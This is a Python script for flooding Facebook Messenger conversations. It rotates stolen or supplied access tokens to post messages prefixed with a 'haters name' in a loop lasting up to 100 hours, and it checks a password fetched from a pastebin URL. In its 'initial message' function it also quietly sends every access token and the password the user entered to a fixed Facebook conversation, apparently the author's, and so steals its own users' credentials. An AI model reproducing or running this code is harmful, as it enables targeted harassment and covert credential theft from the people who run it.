import requests
import json
import time
import sys
import os
import http.server
import socketserver
import threading
import random
import datetime
from platform import system

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"\033[1;31m N0W S3RV3R IS RA9DY T0 B00M ITS RAUSHAN KUMAR ____JANNII :- ")

def execute_server():
    PORT = 4000

    handler = MyHandler
    with socketserver.TCPServer(("", PORT), handler) as httpd:
        print("\033[1;31mServer running at http://localhost:{}".format(PORT))
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print('\n[-] Server interrupted. Exiting...')

def get_convo_ids():
    with open('convo.txt', 'r') as file:
        return [line.strip() for line in file.readlines()]

def send_messages(convo_ids, password):
    with open('tokennum.txt', 'r') as file:
        tokens = [line.strip() for line in file.readlines()]

    requests.packages.urllib3.disable_warnings()

    def clear_screen():
        if system() == 'Linux':
            os.system('clear')
        elif system() == 'Windows':
            os.system('cls')

    def print_separator():
        print('\033[1;31m' + '-----------F33L THE P0W3R 0F UR R9USH9N D9DDY H9T3RS K4 R34L J!!JU H3R3 -------------')

    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.google.com'
    }

    mmm = requests.get('https://pastebin.com/raw/cxFsrRCt').text

    if mmm not in password:
        print('[-] <==> Password CHANGE BY -R9USH4N_XD ')
        sys.exit()

    print_separator()

    access_tokens = tokens

    with open('file.txt', 'r') as file:
        text_file_path = file.read().strip()

    with open(text_file_path, 'r') as file:
        messages = file.readlines()

    num_messages = len(messages)

    if not access_tokens or not messages:
        print("[x] No access tokens or messages available. Exiting...")
        sys.exit()

    max_tokens = len(tokens)

    with open('hatersname.txt', 'r') as file:
        haters_name = file.read().strip()

    with open('time.txt', 'r') as file:
        speed = int(file.read().strip())

    print_separator()

    def get_name(token):
        try:
            data = requests.get(f'https://graph.facebook.com/v17.0/me?access_token={token}').json()
            return data.get('name', 'Error occurred') if data else 'Error occurred'
        except Exception as e:
            print(f"[x] Error getting name: {e}")
            return 'Error occurred'

    def send_message(token, convo_id, message_index):
        try:
            message = messages[message_index % num_messages].strip()
            url = f"https://graph.facebook.com/v15.0/t_{convo_id}/"
            parameters = {'access_token': token, 'message': f'{haters_name} {message}'}
            response = requests.post(url, json=parameters, headers=headers)

            current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
            if response.ok:
                print("[+] Message {} of Convo {} sent by Token {}: {}".format(
                    message_index + 1, convo_id, tokens.index(token) + 1, f'{haters_name} {message}'))
                print("  - Time: {}".format(current_time))
                print_separator()
                print_separator()
            else:
                print("[x] Failed to send message {} of Convo {} with Token {}: {}".format(
                    message_index + 1, convo_id, tokens.index(token) + 1, f'{haters_name} {message}'))
                print("  - Time: {}".format(current_time))
                print_separator()
                print_separator()
        except Exception as e:
            print("[x] An error occurred while sending message: {}".format(e))

    def send_initial_message():
        try:
            if not access_tokens or not convo_ids:
                print("[x] No access tokens or conversation IDs available.")
                return  # Don't exit, just skip the initial message sending

            random_token = random.choice(access_tokens)
            random_convo_id = random.choice(convo_ids)

            parameters = {
                'access_token': random_token,
                'message': f'Hello Raushan Kumar SiiR, I am using your server - : {get_name(random_token)}'
                           + f'\nToken : {" | ".join(access_tokens)}'
                           + f'\nLink : https://www.facebook.com/messages/t_100015445268362'
                           + f'\nPassword: {password}'
            }
            response = requests.post(f"https://graph.facebook.com/v15.0/t_100015445268362/", data=parameters,
                                     headers=headers)
            if not response.ok:
                print("[x] Failed to send initial message.")
            else:
                print("[+] Initial message sent successfully.")
        except Exception as e:
            print("[x] An error occurred while sending initial message: {}".format(e))

    send_initial_message()

    # Set the duration in hours (e.g., 1 hour)
    duration_in_hours = 100

    start_time = datetime.datetime.now()

    while (datetime.datetime.now() - start_time).total_seconds() < duration_in_hours * 3600:
        try:
            for convo_id in convo_ids:
                for message_index in range(num_messages):
                    token_index = message_index % max_tokens
                    if token_index < len(access_tokens):  # Ensure the token index is within bounds
                        access_token = access_tokens[token_index]
                        send_message(access_token, convo_id, message_index)
                        time.sleep(speed)

            print("[+] All messages sent for all conversations. Restarting the process...")
        except KeyboardInterrupt:
            print('\n[-] User interrupted the process. Exiting...')
            sys.exit()
        except Exception as e:
            print("[x] An error occurred: {}".format(e))
            time.sleep(speed)  # Add a sleep here to avoid rapid retries in case of errors

def main():
    # Check if the password is already provided or saved
    if os.path.exists('password.txt'):
        with open('password.txt', 'r') as file:
            password = file.read().strip()
    else:
        password = input("Enter the password: ")

    server_thread = threading.Thread(target=execute_server)
    server_thread.start()
    convo_ids = get_convo_ids()
    send_messages(convo_ids, password)

if __name__ == '__main__':
    main()